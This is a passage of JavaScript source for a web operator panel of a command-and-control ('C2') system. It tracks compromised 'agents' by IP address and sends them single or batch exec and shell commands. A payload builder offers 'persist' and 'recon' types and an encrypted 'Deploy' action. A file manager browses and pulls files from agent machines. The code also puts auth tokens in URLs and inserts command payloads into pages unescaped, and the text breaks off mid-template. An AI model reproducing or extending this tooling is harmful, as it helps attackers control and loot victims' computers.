/**
 * SecureComm Dashboard v3.0 - Enterprise C2 Interface
 * Real-time monitoring, command orchestration, and analytics with advanced features
 *
 * NEW FEATURES v3.0:
 * - Complete payload builder with encryption visualization
 * - File manager with upload/download capabilities
 * - PKI certificate inspector
 * - Batch command execution
 * - Command templates library
 * - Advanced search and filtering
 * - Real-time validation
 *
 * Author: Shadow Junior
 * Version: 3.0.0 - Academic Production Release
 */

class SecureCommDashboard {
    constructor() {
        this.apiBase = '/api';
        this.wsUrl = `${window.location.protocol === 'https:' ? 'wss:' : 'ws:'}//${window.location.host}/ws`;
        this.token = window.DASHBOARD_TOKEN || this.getToken();
        this.autoRefresh = true;
        this.refreshInterval = window.AUTO_REFRESH_INTERVAL || 5000;
        this.refreshTimer = null;
        this.ws = null;
        this.wsReconnectAttempts = 0;
        this.maxWsReconnectAttempts = 5;
        this.wsReconnectDelay = 3000;
        this.currentPage = 'dashboard';
        this.agents = [];
        this.commands = [];
        this.stats = {};
        this.selectedAgents = new Set();

        // NEW: Enhanced state
        this.certificates = [];
        this.files = [];
        this.templates = {};
        this.currentAgent = null;
        this.searchQuery = '';
        this.statusFilter = 'all';

        this.init();
    }

    init() {
        this.bindEvents();
        this.initWebSocket();
        this.loadData();
        this.startAutoRefresh();
        this.updateConnectionStatus('connected');
    }

    // ==================== TOKEN & AUTH ====================

    getToken() {
        const urlParams = new URLSearchParams(window.location.search);
        const token = urlParams.get('token');
        if (token) {
            sessionStorage.setItem('securecomm_token', token);
            return token;
        }
        return sessionStorage.getItem('securecomm_token') || '';
    }

    getHeaders() {
        const headers = {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        };
        if (this.token) {
            headers['Authorization'] = `Bearer ${this.token}`;
        }
        return headers;
    }

    // ==================== WEBSOCKET ====================

    initWebSocket() {
        if (!this.token) return;

        try {
            this.ws = new WebSocket(`${this.wsUrl}?token=${this.token}`);

            this.ws.onopen = () => {
                console.log('WebSocket connected');
                this.wsReconnectAttempts = 0;
                this.updateConnectionStatus('connected');
                this.showToast('Real-time updates enabled', 'success');
            };

            this.ws.onmessage = (event) => {
                try {
                    const message = JSON.parse(event.data);
                    this.handleWebSocketMessage(message);
                } catch (e) {
                    console.error('WebSocket message parse error:', e);
                }
            };

            this.ws.onclose = () => {
                console.log('WebSocket disconnected');
                this.updateConnectionStatus('disconnected');
                this.attemptWebSocketReconnect();
            };

            this.ws.onerror = (error) => {
                console.error('WebSocket error:', error);
                this.updateConnectionStatus('error');
            };

        } catch (e) {
            console.error('WebSocket initialization failed:', e);
        }
    }

    attemptWebSocketReconnect() {
        if (this.wsReconnectAttempts >= this.maxWsReconnectAttempts) {
            console.log('Max WebSocket reconnect attempts reached');
            this.showToast('Real-time updates disabled. Using polling.', 'warning');
            return;
        }

        this.wsReconnectAttempts++;
        console.log(`Attempting WebSocket reconnect ${this.wsReconnectAttempts}/${this.maxWsReconnectAttempts}`);

        setTimeout(() => {
            this.initWebSocket();
        }, this.wsReconnectDelay);
    }

    handleWebSocketMessage(message) {
        switch (message.type) {
            case 'command_sent':
                this.showToast(`Command sent to ${message.data.agent_id}`, 'success');
                this.loadData();
                break;
            case 'agent_connected':
                this.showToast(`Agent ${message.data.agent_id} connected`, 'success');
                this.loadData();
                break;
            case 'agent_disconnected':
                this.showToast(`Agent ${message.data.agent_id} disconnected`, 'warning');
                this.loadData();
                break;
            case 'command_completed':
                this.showToast(`Command ${message.data.task_id} completed`, 'info');
                this.loadData();
                break;
            case 'batch_command_sent':
                this.showToast(`Batch command sent to ${message.data.agents_count} agents`, 'success');
                this.loadData();
                break;
            case 'security_event':
                this.showToast(`Security event: ${message.data.event}`, 'error');
                break;
            case 'ping':
            case 'pong':
                break;
            default:
                console.log('Unknown WebSocket message:', message);
        }
    }

    sendWebSocketMessage(message) {
        if (this.ws && this.ws.readyState === WebSocket.OPEN) {
            this.ws.send(JSON.stringify(message));
        }
    }

    // ==================== EVENT BINDING ====================

    bindEvents() {
        // Navigation
        document.querySelectorAll('.nav-link').forEach(link => {
            link.addEventListener('click', (e) => {
                document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
                e.target.closest('.nav-link').classList.add('active');
            });
        });

        // Refresh button
        const refreshBtn = document.getElementById('refresh-btn');
        if (refreshBtn) {
            refreshBtn.addEventListener('click', () => {
                this.loadData();
                this.showToast('Data refreshed', 'info');
            });
        }

        // Auto-refresh toggle
        const autoRefreshToggle = document.getElementById('auto-refresh');
        if (autoRefreshToggle) {
            autoRefreshToggle.addEventListener('change', (e) => {
                this.autoRefresh = e.target.checked;
                if (this.autoRefresh) {
                    this.startAutoRefresh();
                    this.showToast('Auto-refresh enabled', 'info');
                } else {
                    this.stopAutoRefresh();
                    this.showToast('Auto-refresh disabled', 'info');
                }
            });
        }

        // NEW: Payload builder button
        const payloadBuilderBtn = document.getElementById('btn-payload-builder');
        if (payloadBuilderBtn) {
            payloadBuilderBtn.addEventListener('click', () => this.openPayloadBuilder());
        }

        // NEW: File manager button
        const fileManagerBtn = document.getElementById('btn-file-manager');
        if (fileManagerBtn) {
            fileManagerBtn.addEventListener('click', () => this.openFileManager());
        }

        // NEW: Certificate viewer button
        const certViewerBtn = document.getElementById('btn-cert-viewer');
        if (certViewerBtn) {
            certViewerBtn.addEventListener('click', () => this.openCertificateViewer());
        }

        // NEW: Batch command button
        const batchCommandBtn = document.getElementById('btn-batch-command');
        if (batchCommandBtn) {
            batchCommandBtn.addEventListener('click', () => this.executeBatchCommand());
        }

        // Command modal
        const newCommandBtn = document.getElementById('btn-new-command');
        if (newCommandBtn) {
            newCommandBtn.addEventListener('click', () => this.openCommandModal());
        }

        const modalClose = document.querySelector('.modal-close');
        if (modalClose) {
            modalClose.addEventListener('click', () => this.closeCommandModal());
        }

        const modal = document.getElementById('command-modal');
        if (modal) {
            modal.addEventListener('click', (e) => {
                if (e.target === modal) this.closeCommandModal();
            });
        }

        const commandForm = document.getElementById('command-form');
        if (commandForm) {
            commandForm.addEventListener('submit', (e) => this.handleCommandSubmit(e));
        }

        // Command type change
        const cmdTypeSelect = document.getElementById('cmd-type');
        if (cmdTypeSelect) {
            cmdTypeSelect.addEventListener('change', (e) => {
                this.handleCommandTypeChange(e.target.value);
            });
        }

        // NEW: Search functionality
        const searchInput = document.getElementById('search-input');
        if (searchInput) {
            searchInput.addEventListener('input', (e) => {
                this.searchQuery = e.target.value.toLowerCase();
                this.filterAndRenderAgents();
            });
        }

        // NEW: Status filter
        const statusFilter = document.getElementById('status-filter');
        if (statusFilter) {
            statusFilter.addEventListener('change', (e) => {
                this.statusFilter = e.target.value;
                this.filterAndRenderAgents();
            });
        }
    }

    // ==================== DATA LOADING ====================

    async loadData() {
        this.updateConnectionStatus('loading');

        try {
            const [stateResponse, statsResponse] = await Promise.all([
                fetch(`${this.apiBase}/state`, { headers: this.getHeaders() }),
                                                                     fetch(`${this.apiBase}/stats`, { headers: this.getHeaders() })
            ]);

            if (!stateResponse.ok || !statsResponse.ok) {
                throw new Error('Failed to fetch data');
            }

            const state = await stateResponse.json();
            const stats = await statsResponse.json();

            this.agents = state.agents || [];
            this.commands = state.commands || [];
            this.stats = stats;

            this.renderDashboard();
            this.updateLastRefresh();
            this.updateConnectionStatus('connected');

        } catch (error) {
            console.error('Error loading data:', error);
            this.updateConnectionStatus('error');
            this.showToast('Failed to load data', 'error');
        }
    }

    // NEW: Load additional data
    async loadCertificates() {
        try {
            const response = await fetch(`${this.apiBase}/certificates`, {
                headers: this.getHeaders()
            });

            if (!response.ok) throw new Error('Failed to fetch certificates');

            const data = await response.json();
            this.certificates = data.certificates || [];
            return this.certificates;

        } catch (error) {
            console.error('Error loading certificates:', error);
            this.showToast('Failed to load certificates', 'error');
            return [];
        }
    }

    // NEW: Load agent files
    async loadAgentFiles(agentId) {
        try {
            const response = await fetch(`${this.apiBase}/files/browse?agent_id=${agentId}`, {
                headers: this.getHeaders()
            });

            if (!response.ok) throw new Error('Failed to fetch files');

            const data = await response.json();
            this.files = data.files || [];
            return this.files;

        } catch (error) {
            console.error('Error loading files:', error);
            this.showToast('Failed to load files', 'error');
            return [];
        }
    }

    // NEW: Load payload templates
    async loadPayloadTemplates() {
        try {
            const response = await fetch(`${this.apiBase}/payload/templates`, {
                headers: this.getHeaders()
            });

            if (!response.ok) throw new Error('Failed to fetch templates');

            const data = await response.json();
            this.templates = data.templates || {};
            return this.templates;

        } catch (error) {
            console.error('Error loading templates:', error);
            this.showToast('Failed to load templates', 'error');
            return {};
        }
    }

    // ==================== RENDERING ====================

    renderDashboard() {
        this.renderStats();
        this.renderAgents();
        this.renderCommands();
    }

    renderStats() {
        // Update stat cards
        const statElements = {
            'stat-total-agents': this.stats.total_agents || 0,
            'stat-active-agents': this.stats.active_agents || 0,
            'stat-total-commands': this.stats.total_commands || 0,
            'stat-pending-commands': this.stats.pending_commands || 0,
            'stat-success-rate': this.calculateSuccessRate(),
            'stat-uptime': this.formatUptime(this.stats.uptime_seconds || 0)
        };

        for (const [id, value] of Object.entries(statElements)) {
            const el = document.getElementById(id);
            if (el) el.textContent = value;
        }

        // NEW: Enhanced stats
        const dataTransferred = document.getElementById('stat-data-transferred');
        if (dataTransferred) {
            dataTransferred.textContent = `${(this.stats.data_transferred_mb || 0).toFixed(2)} MB`;
        }

        const avgResponseTime = document.getElementById('stat-avg-response-time');
        if (avgResponseTime) {
            avgResponseTime.textContent = `${(this.stats.avg_response_time_ms || 0).toFixed(0)} ms`;
        }
    }

    renderAgents() {
        const tbody = document.getElementById('agents-tbody');
        if (!tbody) return;

        if (this.agents.length === 0) {
            tbody.innerHTML = '<tr><td colspan="7" class="empty-hint">No agents connected</td></tr>';
            return;
        }

        // Apply filters
        let filteredAgents = this.filterAgents();

        tbody.innerHTML = filteredAgents.map(agent => `
        <tr data-agent-id="${this.escapeHtml(agent.agent_id)}">
        <td>
        <input type="checkbox" class="agent-select"
        ${this.selectedAgents.has(agent.agent_id) ? 'checked' : ''}
        onchange="dashboard.toggleAgentSelection('${this.escapeHtml(agent.agent_id)}', this.checked)">
        </td>
        <td><code class="agent-id">${this.escapeHtml(agent.agent_id)}</code></td>
        <td>${this.escapeHtml(agent.ip_address || '-')}</td>
        <td><span class="status-badge status-${agent.status}">${this.escapeHtml(agent.status)}</span></td>
        <td>${this.formatTimestamp(agent.connected_at)}</td>
        <td>${this.formatRelativeTime(agent.last_seen)}</td>
        <td>
        <div class="action-buttons">
        <button class="btn btn-sm btn-primary" onclick="dashboard.sendCommandTo('${this.escapeHtml(agent.agent_id)}')">
        Command
        </button>
        <button class="btn btn-sm btn-info" onclick="dashboard.viewAgentDetails('${this.escapeHtml(agent.agent_id)}')">
        Details
        </button>
        <button class="btn btn-sm btn-secondary" onclick="dashboard.openFileManager('${this.escapeHtml(agent.agent_id)}')">
        Files
        </button>
        </div>
        </td>
        </tr>
        `).join('');
    }

    renderCommands() {
        const tbody = document.getElementById('commands-tbody');
        if (!tbody) return;

        if (this.commands.length === 0) {
            tbody.innerHTML = '<tr><td colspan="6" class="empty-hint">No commands issued</td></tr>';
            return;
        }

        tbody.innerHTML = this.commands.slice(0, 20).map(cmd => `
        <tr>
        <td><code class="task-id">${this.truncate(cmd.task_id, 12)}</code></td>
        <td><code>${this.escapeHtml(cmd.agent_id)}</code></td>
        <td><span class="type-badge">${this.escapeHtml(cmd.command_type)}</span></td>
        <td><span class="status-badge status-${cmd.status}">${this.escapeHtml(cmd.status)}</span></td>
        <td>${this.formatRelativeTime(cmd.created_at)}</td>
        <td>${this.truncate(cmd.payload, 40)}</td>
        </tr>
        `).join('');
    }

    // NEW: Filter agents based on search and status
    filterAgents() {
        return this.agents.filter(agent => {
            // Status filter
            if (this.statusFilter !== 'all' && agent.status !== this.statusFilter) {
                return false;
            }

            // Search filter
            if (this.searchQuery) {
                const searchLower = this.searchQuery.toLowerCase();
                return (
                    agent.agent_id.toLowerCase().includes(searchLower) ||
                    (agent.ip_address || '').toLowerCase().includes(searchLower) ||
                    (agent.certificate_subject || '').toLowerCase().includes(searchLower)
                );
            }

            return true;
        });
    }

    filterAndRenderAgents() {
        this.renderAgents();
    }

    // ==================== COMMAND HANDLING ====================

    openCommandModal(agentId = null) {
        const modal = document.getElementById('command-modal');
        if (!modal) return;

        if (agentId) {
            const agentSelect = document.getElementById('cmd-agent');
            if (agentSelect) agentSelect.value = agentId;
        }

        modal.style.display = 'flex';
    }

    closeCommandModal() {
        const modal = document.getElementById('command-modal');
        if (modal) modal.style.display = 'none';
    }

    handleCommandTypeChange(type) {
        const payloadGroup = document.getElementById('cmd-payload-group');
        const pathGroup = document.getElementById('cmd-path-group');

        if (!payloadGroup || !pathGroup) return;

        if (type === 'upload' || type === 'download') {
            payloadGroup.style.display = 'none';
            pathGroup.style.display = 'block';
        } else {
            payloadGroup.style.display = 'block';
            pathGroup.style.display = 'none';
        }
    }

    async handleCommandSubmit(e) {
        e.preventDefault();

        const form = e.target;
        const agentId = form.querySelector('#cmd-agent').value;
        const cmdType = form.querySelector('#cmd-type').value;

        let payload;
        if (cmdType === 'upload' || cmdType === 'download') {
            payload = form.querySelector('#cmd-path').value;
        } else {
            payload = form.querySelector('#cmd-payload').value;
        }

        this.closeCommandModal();

        try {
            const response = await fetch(`${this.apiBase}/command`, {
                method: 'POST',
                headers: this.getHeaders(),
                                         body: JSON.stringify({
                                             agent_id: agentId,
                                             type: cmdType,
                                             payload: payload
                                         })
            });

            const result = await response.json();

            if (!response.ok) {
                throw new Error(result.error || 'Command failed');
            }

            this.showToast(`Command sent successfully (Task ID: ${result.task_id})`, 'success');
            this.loadData();

        } catch (error) {
            console.error('Command error:', error);
            this.showToast(`Command failed: ${error.message}`, 'error');
        }
    }

    sendCommandTo(agentId) {
        this.openCommandModal(agentId);
    }

    // NEW: Toggle agent selection
    toggleAgentSelection(agentId, selected) {
        if (selected) {
            this.selectedAgents.add(agentId);
        } else {
            this.selectedAgents.delete(agentId);
        }

        // Update batch command button state
        const batchBtn = document.getElementById('btn-batch-command');
        if (batchBtn) {
            batchBtn.disabled = this.selectedAgents.size === 0;
            batchBtn.textContent = this.selectedAgents.size > 0
            ? `Batch Command (${this.selectedAgents.size})`
            : 'Batch Command';
        }
    }

    handleSelectAll(checked) {
        document.querySelectorAll('.agent-select').forEach(cb => {
            cb.checked = checked;
            const agentId = cb.closest('tr')?.dataset.agentId;
            if (agentId) {
                if (checked) this.selectedAgents.add(agentId);
                else this.selectedAgents.delete(agentId);
            }
        });

        // Update batch button
        this.toggleAgentSelection('', false);
    }

    // NEW: Execute batch command
    async executeBatchCommand() {
        if (this.selectedAgents.size === 0) {
            this.showToast('No agents selected', 'warning');
            return;
        }

        const cmdType = prompt('Enter command type (exec/shell/status/info):');
        if (!cmdType) return;

        const payload = prompt('Enter command payload:');
        if (!payload) return;

        if (!confirm(`Execute ${cmdType} on ${this.selectedAgents.size} agents?`)) {
            return;
        }

        try {
            const response = await fetch(`${this.apiBase}/command/batch`, {
                method: 'POST',
                headers: this.getHeaders(),
                                         body: JSON.stringify({
                                             agent_ids: Array.from(this.selectedAgents),
                                                              type: cmdType,
                                                              payload: payload
                                         })
            });

            const result = await response.json();

            if (!response.ok) {
                throw new Error(result.error || 'Batch command failed');
            }

            const summary = result.summary || {};
            this.showToast(
                `Batch command: ${summary.successful || 0} successful, ${summary.failed || 0} failed`,
                summary.successful > 0 ? 'success' : 'error'
            );

            // Clear selection
            this.selectedAgents.clear();
            this.loadData();

        } catch (error) {
            console.error('Batch command error:', error);
            this.showToast(`Batch command failed: ${error.message}`, 'error');
        }
    }

    // ==================== NEW: PAYLOAD BUILDER ====================

    async openPayloadBuilder() {
        // Load templates
        await this.loadPayloadTemplates();

        // Create payload builder modal
        const modal = document.createElement('div');
        modal.className = 'modal';
        modal.id = 'payload-builder-modal';
        modal.innerHTML = `
        <div class="modal-content" style="max-width: 900px;">
        <div class="modal-header">
        <h3>🔧 Payload Builder</h3>
        <button class="modal-close" onclick="this.closest('.modal').remove()">&times;</button>
        </div>
        <div class="modal-body">
        <div class="payload-builder-grid">
        <div class="builder-section">
        <h4>Configuration</h4>
        <div class="form-group">
        <label>Agent</label>
        <select id="payload-agent">
        ${this.agents.map(a => `
            <option value="${this.escapeHtml(a.agent_id)}">
            ${this.escapeHtml(a.agent_id)} (${this.escapeHtml(a.ip_address || 'unknown')})
            </option>
            `).join('')}
            </select>
            </div>
            <div class="form-group">
            <label>Command Type</label>
            <select id="payload-type">
            <option value="exec">Execute</option>
            <option value="shell">Shell</option>
            <option value="upload">Upload</option>
            <option value="download">Download</option>
            <option value="persist">Persist</option>
            <option value="recon">Recon</option>
            </select>
            </div>
            <div class="form-group">
            <label>Command Data</label>
            <textarea id="payload-data" rows="6" placeholder="Enter command data..."></textarea>
            </div>
            <button class="btn btn-primary" onclick="dashboard.buildPayload()">
            🔐 Build Encrypted Payload
            </button>
            </div>

            <div class="builder-section">
            <h4>Templates</h4>
            <div class="template-list">
            ${Object.entries(this.templates).map(([name, template]) => `
                <div class="template-item" onclick="dashboard.applyTemplate('${name}')">
                <div class="template-header">
                <strong>${this.escapeHtml(template.name)}</strong>
                <span class="risk-badge risk-${template.risk_level || 'medium'}">
                ${template.risk_level || 'medium'}
                </span>
                </div>
                <p class="template-desc">${this.escapeHtml(template.description)}</p>
                <div class="template-meta">
                ${template.commands_count} commands
                ${template.requires_admin ? '⚠️ Admin' : ''}
                </div>
                </div>
                `).join('')}
                </div>
                </div>
                </div>

                <div class="payload-result" id="payload-result" style="display: none;">
                <h4>Encrypted Payload</h4>
                <div class="payload-details">
                <div class="detail-row">
                <span>Algorithm:</span>
                <code id="payload-algorithm">-</code>
                </div>
                <div class="detail-row">
                <span>Size:</span>
                <code id="payload-size">-</code>
                </div>
                <div class="detail-row">
                <span>Timestamp:</span>
                <code id="payload-timestamp">-</code>
                </div>
                </div>
                <textarea id="payload-output" readonly rows="10"></textarea>
                <div class="button-group">
                <button class="btn btn-secondary" onclick="dashboard.copyPayload()">📋 Copy</button>
                <button class="btn btn-primary" onclick="dashboard.deployPayload()">🚀 Deploy</button>
                </div>
                </div>
                </div>
                </div>
                `;

                document.body.appendChild(modal);
                modal.addEventListener('click', (e) => {
                    if (e.target === modal) modal.remove();
                });
    }

    async buildPayload() {
        const agentId = document.getElementById('payload-agent')?.value;
        const cmdType = document.getElementById('payload-type')?.value;
        const cmdData = document.getElementById('payload-data')?.value;

        if (!agentId || !cmdType || !cmdData) {
            this.showToast('All fields are required', 'warning');
            return;
        }

        try {
            const response = await fetch(`${this.apiBase}/payload/build`, {
                method: 'POST',
                headers: this.getHeaders(),
                                         body: JSON.stringify({
                                             agent_id: agentId,
                                             command_type: cmdType,
                                             command_data: cmdData
                                         })
            });

            const result = await response.json();

            if (!response.ok) {
                throw new Error(result.error || 'Payload build failed');
            }

            // Store payload for deployment
            this.currentPayload = result.payload;
            this.currentPayloadAgent = agentId;

            // Display result
            const resultSection = document.getElementById('payload-result');
            if (resultSection) {
                resultSection.style.display = 'block';

                document.getElementById('payload-algorithm').textContent = result.metadata.encryption;
                document.getElementById('payload-size').textContent = `${result.metadata.payload_size_bytes} bytes`;
                document.getElementById('payload-timestamp').textContent = result.metadata.timestamp;
                document.getElementById('payload-output').value = JSON.stringify(result.payload, null, 2);
            }

            this.showToast('Payload built successfully', 'success');

        } catch (error) {
            console.error('Payload build error:', error);
            this.showToast(`Payload build failed: ${error.message}`, 'error');
        }
    }

    applyTemplate(templateName) {
        // Load template details and populate form
        this.showToast(`Template "${templateName}" loaded (implementation pending)`, 'info');
    }

    copyPayload() {
        const output = document.getElementById('payload-output');
        if (output) {
            output.select();
            document.execCommand('copy');
            this.showToast('Payload copied to clipboard', 'success');
        }
    }

    async deployPayload() {
        if (!this.currentPayload || !this.currentPayloadAgent) {
            this.showToast('No payload to deploy', 'warning');
            return;
        }

        if (!confirm(`Deploy payload to agent ${this.currentPayloadAgent}?`)) {
            return;
        }

        // Implementation: Send the encrypted payload as a command
        this.showToast('Payload deployment (implementation pending)', 'info');
    }

    // ==================== NEW: FILE MANAGER ====================

    async openFileManager(agentId = null) {
        if (!agentId && this.agents.length > 0) {
            agentId = this.agents[0].agent_id;
        }

        if (!agentId) {
            this.showToast('No agents available', 'warning');
            return;
        }

        // Load files
        await this.loadAgentFiles(agentId);

        // Create file manager modal
        const modal = document.createElement('div');
        modal.className = 'modal';
        modal.id = 'file-manager-modal';
        modal.innerHTML = `
        <div class="modal-content" style="max-width: 1000px;">
        <div class="modal-header">
        <h3>📁 File Manager - ${this.escapeHtml(agentId)}</h3>
        <button class="modal-close" onclick="this.closest('.modal').remove()">&times;</button>
        </div>
        <div class="modal-body">
        <div class="file-manager-toolbar">
        <div class="form-group">
        <label>Agent:</label>
        <select id="file-manager-agent" onchange="dashboard.switchFileManagerAgent(this.value)">
        ${this.agents.map(a => `
            <option value="${this.escapeHtml(a.agent_id)}" ${a.agent_id === agentId ? 'selected' : ''}>
            ${this.escapeHtml(a.agent_id)}
            </option>
            `).join('')}
            </select>
            </div>
            <button class="btn btn-primary" onclick="dashboard.uploadFileToAgent()">
            ⬆️ Upload File
            </button>
            <button class="btn btn-secondary" onclick="dashboard.refreshFileList()">
            🔄 Refresh
            </button>
            </div>

            <div class="file-list-container">
            <table class="data-table">
            <thead>
            <tr>
            <th>Name</th>
            <th>Type</th>
            <th>Size</th>
            <th>Modified</th>
            <th>Actions</th>
            </tr>
            </thead>
            <tbody id="file-manager-tbody">
            ${this.renderFileList()}
            </tbody>
            </table>
            </div>
            </div>
            </div>
            `;

            document.body.appendChild(modal);
            modal.addEventListener('click', (e) => {
                if (e.target === modal) modal.remove();
            });

                this.currentAgent = agentId;
    }

    renderFileList() {
        if (this.files.length === 0) {
            return '<tr><td colspan="5" class="empty-hint">No files found</td></tr>';
        }

        return this.files.map(file => `
        <tr>
        <td>
        <span class="file-icon">${file.is_directory ? '📁' : this.getFileIcon(file.mime_type)}</span>
        ${this.escapeHtml(file.name)}
        </td>
        <td>${this.escapeHtml(file.mime_type || '-')}</td>
        <td>${this.escapeHtml(file.size_human)}</td>
        <td>${this.formatRelativeTime(file.modified_at)}</td>
        <td>
        ${!file.is_directory ? `
            <button class="btn btn-sm btn-info" onclick="dashboard.downloadFile('${this.escapeHtml(file.path)}')">
            ⬇️ Download
            </button>
            ` : ''}
            </td>
            </tr>
            `).join('');
    }

    getFileIcon(mimeType) {
        if (!mimeType) return '📄';
        if (mimeType.startsWith('image/')) return '🖼️';
        if (mimeType.startsWith('video/')) return '🎥';
        if (mimeType.startsWith('audio/')) return '🎵';
        if (mimeType.includes('pdf')) return '📕';
        if (mimeType.includes('zip') || mimeType.includes('compressed')) return '📦';
        if (mimeType.includes('text/')) return '📝';
        return '📄';
    }

    async switchFileManagerAgent(agentId) {
        this.currentAgent = agentId;
        await this.loadAgentFiles(agentId);

        const tbody = document.getElementById('file-manager-tbody');
        if (tbody) {
            tbody.innerHTML = this.renderFileList();
        }
    }

    async refreshFileList() {
        if (!this.currentAgent) return;
        await this.loadAgentFiles(this.currentAgent);

        const tbody = document.getElementById('file-manager-tbody');
        if (tbody) {
            tbody.innerHTML = this.renderFileList();
        }

        this.showToast('File list refreshed', 'success');
    }

    async uploadFileToAgent() {
        const input = document.createElement('input');
        input.type = 'file';
        input.onchange = async (e) => {
            const file = e.target.files[0];
            if (!file) return;

            const formData = new FormData();
            formData.append('file', file);

            try {
                const response = await fetch(
                    `${this.apiBase}/files/upload?agent_id=${this.currentAgent}`,
                    {
                        method: 'POST',
                        headers: {
                            'Authorization': `Bearer ${this.token}`
                        },
                        body: formData
                    }
                );

                const result = await response.json();

                if (!response.ok) {
                    throw new Error(result.error || 'Upload failed');
                }

                this.showToast(`File "${file.name}" uploaded successfully`, 'success');
                await this.refreshFileList();

            } catch (error) {
                console.error('File upload error:', error);
                this.showToast(`Upload failed: ${error.message}`, 'error');
            }
        };
        input.click();
    }

    async downloadFile(filePath) {
        const url = `${this.apiBase}/files/download?agent_id=${this.currentAgent}&path=${encodeURIComponent(filePath)}&token=${this.token}`;
        window.open(url, '_blank');
    }

    // ==================== NEW: CERTIFICATE VIEWER ====================

    async openCertificateViewer() {
        await this.loadCertificates();

        const modal = document.createElement('div');
        modal.className = 'modal';
        modal.id = 'cert-viewer-modal';
        modal.innerHTML = `
        <div class="modal-content" style="max-width: 1000px;">
        <div class="modal-header">
        <h3>🔐 PKI Certificate Inspector</h3>
        <button class="modal-close" onclick="this.closest('.modal').remove()">&times;</button>
        </div>
        <div class="modal-body">
        <table class="data-table">
        <thead>
        <tr>
        <th>Type</th>
        <th>ID/Subject</th>
        <th>Serial Number</th>
        <th>Valid From</th>
        <th>Valid Until</th>
        <th>Status</th>
        <th>Actions</th>
        </tr>
        </thead>
        <tbody>
        ${this.renderCertificateList()}
        </tbody>
        </table>
        </div>
        </div>
        `;

        document.body.appendChild(modal);
        modal.addEventListener('click', (e) => {
            if (e.target === modal) modal.remove();
        });
    }

    renderCertificateList() {
        if (this.certificates.length === 0) {
            return '<tr><td colspan="7" class="empty-hint">No certificates found</td></tr>';
        }

        return this.certificates.map(cert => `
        <tr>
        <td><span class="type-badge">${this.escapeHtml(cert.type)}</span></td>
        <td><code>${this.truncate(cert.subject, 40)}</code></td>
        <td><code>${this.truncate(cert.serial_number, 16)}</code></td>
        <td>${this.formatTimestamp(cert.not_before)}</td>
        <td>${this.formatTimestamp(cert.not_after)}</td>
        <td>
        <span class="status-badge status-${cert.is_valid ? 'success' : 'error'}">
        ${cert.is_valid ? 'Valid' : 'Expired'}
        </span>
        </td>
        <td>
        <button class="btn btn-sm btn-info" onclick="dashboard.viewCertificateDetails('${cert.type}', '${cert.agent_id || cert.operator_id || 'ca_root'}')">
        Details
        </button>
        </td>
        </tr>
        `).join('');
    }

    async viewCertificateDetails(certType, certId) {
        try {
            const response = await fetch(
                `${this.apiBase}/certificates/${certType}/${certId}`,
                { headers: this.getHeaders() }
            );

            if (!response.ok) throw new Error('Failed to fetch certificate details');

            const data = await response.json();
            const cert = data.certificate;

            const detailModal = document.createElement('div');
            detailModal.className = 'modal';
            detailModal.innerHTML = `
            <div class="modal-content" style="max-width: 800px;">
            <div class="modal-header">
            <h3>Certificate Details - ${this.escapeHtml(certId)}</h3>
            <button class="modal-close" onclick="this.closest('.modal').remove()">&times;</button>
            </div>
            <div class="modal-body">
            <div class="cert-details">
            <h4>Subject</h4>
            <pre>${JSON.stringify(cert.subject, null, 2)}</pre>

            <h4>Issuer</h4>
            <pre>${JSON.stringify(cert.issuer, null, 2)}</pre>

            <h4>Validity</h4>
            <div class="detail-table">
            <div class="detail-row">
            <span>Not Before:</span>
            <code>${this.formatTimestamp(cert.not_before)}</code>
            </div>
            <div class="detail-row">
            <span>Not After:</span>
            <code>${this.formatTimestamp(cert.not_after)}</code>
            </div>
            <div class="detail-row">
            <span>Status:</span>
            <span class="status-badge status-${cert.is_valid ? 'success' : 'error'}">
            ${cert.is_valid ? 'Valid' : 'Expired'}
            </span>
            </div>
            </div>

            <h4>Public Key</h4>
            <pre>${JSON.stringify(cert.public_key, null, 2)}</pre>

            <h4>Fingerprint (SHA-256)</h4>
            <code class="fingerprint">${cert.fingerprint_sha256}</code>

            <h4>PEM Certificate</h4>
            <textarea readonly rows="12">${cert.pem}</textarea>
            </div>
            </div>
            </div>
            `;

            document.body.appendChild(detailModal);
            detailModal.addEventListener('click', (e) => {
                if (e.target === detailModal) detailModal.remove();
            });

        } catch (error) {
            console.error('Certificate details error:', error);
            this.showToast(`Failed to load certificate: ${error.message}`, 'error');
        }
    }

    // ==================== AGENT DETAILS ====================

    async viewAgentDetails(agentId) {
        try {
            const response = await fetch(`${this.apiBase}/agents/${agentId}`, {
                headers: this.getHeaders()
            });

            if (!response.ok) throw new Error('Failed to fetch agent details');

            const details = await response.json();

            const modal = document.createElement('div');
            modal.className = 'modal';
            modal.innerHTML = `
            <div class="modal-content">
            <div class="modal-header">
            <h3>Agent Details - ${this.escapeHtml(agentId)}</h3>
            <button class="modal-close" onclick="this.closest('.modal').remove()">&times;</button>
            </div>
            <div class="modal-body">
            <div class="agent-details">
            <div class="detail-section">
            <h4>Information</h4>
            <table class="detail-table">
            <tr><td>Agent ID</td><td><code>${this.escapeHtml(details.agent.agent_id)}</code></td></tr>
            <tr><td>IP Address</td><td>${this.escapeHtml(details.agent.ip_address)}</td></tr>
            <tr><td>Status</td><td><span class="status-badge status-${details.agent.status}">${this.escapeHtml(details.agent.status)}</span></td></tr>
            <tr><td>Connected</td><td>${this.formatTimestamp(details.agent.connected_at)}</td></tr>
            <tr><td>Last Seen</td><td>${this.formatRelativeTime(details.agent.last_seen)}</td></tr>
            <tr><td>Certificate</td><td>${this.escapeHtml(details.agent.certificate_subject)}</td></tr>
            </table>
            </div>
            <div class="detail-section">
            <h4>Recent Commands</h4>
            ${details.commands.length > 0 ? `
                <table class="data-table">
                <thead>
                <tr><th>Type</th><th>Status</th><th>Time</th><th>Payload</th></tr>
                </thead>
                <tbody>
                ${details.commands.slice(0, 5).map(cmd => `
                    <tr>
                    <td><span class="type-badge">${this.escapeHtml(cmd.command_type)}</span></td>
                    <td><span class="status-badge status-${cmd.status}">${this.escapeHtml(cmd.status)}</span></td>
                    <td>${this.formatRelativeTime(cmd.created_at)}</td>
                    <td>${this.truncate(cmd.payload, 30)}</td>
                    </tr>
                    `).join('')}
                    </tbody>
                    </table>
                    ` : '<p class="empty-hint">No commands issued</p>'}
                    </div>
                    </div>
                    </div>
                    <div class="modal-footer">
                    <button class="btn btn-primary" onclick="dashboard.sendCommandTo('${this.escapeHtml(agentId)}'); this.closest('.modal').remove();">Send Command</button>
